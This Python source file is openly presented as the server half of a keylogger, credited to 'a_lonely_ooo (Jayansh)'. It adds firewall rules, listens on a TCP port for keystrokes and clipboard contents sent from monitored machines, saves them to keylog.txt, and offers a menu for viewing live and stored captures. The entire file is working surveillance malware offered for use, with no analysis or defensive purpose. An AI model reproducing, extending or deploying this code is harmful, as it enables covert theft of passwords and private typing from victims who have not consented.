import socket
import time
from colorama import init, Fore, Style
import os
import platform
import subprocess

# Initialize colorama
init(autoreset=True)

# Credits
print(f"{Fore.MAGENTA}=============================================================")
print(f"{Fore.GREEN}Keylogger Server by a_lonely_ooo (Jayansh)")
print(f"{Fore.MAGENTA}============================================================={Style.RESET_ALL}")

# Server details
HOST = '0.0.0.0'
LOG_FILE = 'keylog.txt'

def check_firewall(port):
    """Check and add firewall rule."""
    if platform.system() == "Windows":
        rule_name = f"KeyloggerServer_{port}"
        try:
            subprocess.run(
                f'netsh advfirewall firewall add rule name="{rule_name}" dir=in action=allow protocol=TCP localport={port}',
                shell=True, check=True, capture_output=True
            )
            print(f"{Fore.GREEN}Added firewall rule for port {port}.{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}Firewall rule may exist or requires admin.{Style.RESET_ALL}")
    elif platform.system() == "Linux":
        try:
            subprocess.run(f"ufw allow {port}/tcp", shell=True, check=True, capture_output=True)
            print(f"{Fore.GREEN}Added UFW rule for port {port}.{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}UFW rule may exist or requires sudo.{Style.RESET_ALL}")

def get_port():
    """Prompt for valid port."""
    while True:
        try:
            port_input = input(f"{Fore.CYAN}Enter listening port (1024-65535): {Style.RESET_ALL}")
            port = int(port_input) if port_input.strip() else 7335
            if 1024 <= port <= 65535:
                check_firewall(port)
                return port
            print(f"{Fore.RED}Port must be 1024-65535!{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Invalid input! Enter a number or press Enter.{Style.RESET_ALL}")

def save_to_file(data):
    """Save data to file."""
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{data}\n")
    except Exception as e:
        print(f"{Fore.RED}Error writing to {LOG_FILE}: {e}{Style.RESET_ALL}")

def show_clipboard_history():
    """Show clipboard history from log file."""
    print(f"{Fore.MAGENTA}================= Clipboard History ================={Style.RESET_ALL}")
    try:
        if not os.path.exists(LOG_FILE):
            print(f"{Fore.RED}No logs found.{Style.RESET_ALL}")
            return
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            clipboard_found = False
            for line in f:
                if 'Clipboard:' in line:
                    print(f"{Fore.CYAN}{line.strip()}{Style.RESET_ALL}")
                    clipboard_found = True
            if not clipboard_found:
                print(f"{Fore.RED}No clipboard data found.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error reading {LOG_FILE}: {e}{Style.RESET_ALL}")

def show_logs_history():
    """Show all logs from log file."""
    print(f"{Fore.MAGENTA}================= Logs History ================={Style.RESET_ALL}")
    try:
        if not os.path.exists(LOG_FILE):
            print(f"{Fore.RED}No logs found.{Style.RESET_ALL}")
            return
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            logs = f.readlines()
            if not logs:
                print(f"{Fore.RED}No logs found.{Style.RESET_ALL}")
                return
            for line in logs:
                print(f"{Fore.CYAN}{line.strip()}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error reading {LOG_FILE}: {e}{Style.RESET_ALL}")

def live_logs():
    """Run live logs server."""
    port = get_port()
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, port))
        server_socket.listen(1)
        print(f"{Fore.GREEN}Server listening on {HOST}:{port}. Press Ctrl+C to stop...{Style.RESET_ALL}")

        while True:
            conn, addr = server_socket.accept()
            print(f"{Fore.GREEN}Connected by {addr}{Style.RESET_ALL}")
            conn.setblocking(False)
            try:
                while True:
                    try:
                        data = conn.recv(4096)
                        if not data:
                            break
                        try:
                            keystrokes = data.decode('utf-8')
                            if any(x in keystrokes.lower() for x in ['options', 'http', 'rtsp']):
                                continue
                        except UnicodeDecodeError:
                            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                            keystrokes = f"[{timestamp}] Non-UTF8 data: {data.hex()}"
                        for line in keystrokes.split('\n'):
                            if line.strip():
                                print(f"{Fore.CYAN}Received: {line}{Style.RESET_ALL}")
                                save_to_file(line)
                    except BlockingIOError:
                        time.sleep(0.1)
                        continue
                    except (ConnectionResetError, BrokenPipeError):
                        break
            finally:
                conn.close()
                print(f"{Fore.RED}Disconnected: {addr}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}Stopping live logs...{Style.RESET_ALL}")
    finally:
        server_socket.close()

def display_menu():
    """Display main menu."""
    print(f"\n{Fore.MAGENTA}================= Keylogger Server Menu =================")
    print(f"{Fore.GREEN}1. Live Logs")
    print(f"{Fore.GREEN}2. Clipboard History")
    print(f"{Fore.GREEN}3. Logs History")
    print(f"{Fore.MAGENTA}====================================={Style.RESET_ALL}")

def main():
    """Main function."""
    while True:
        display_menu()
        try:
            choice = input(f"{Fore.CYAN}Select an option (1-3): {Style.RESET_ALL}").strip()
            if choice == '1':
                live_logs()
            elif choice == '2':
                show_clipboard_history()
            elif choice == '3':
                show_logs_history()
            else:
                print(f"{Fore.RED}Invalid option! Choose 1-3.{Style.RESET_ALL}")
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Exiting server...{Style.RESET_ALL}")
            break

if __name__ == "__main__":
    main()
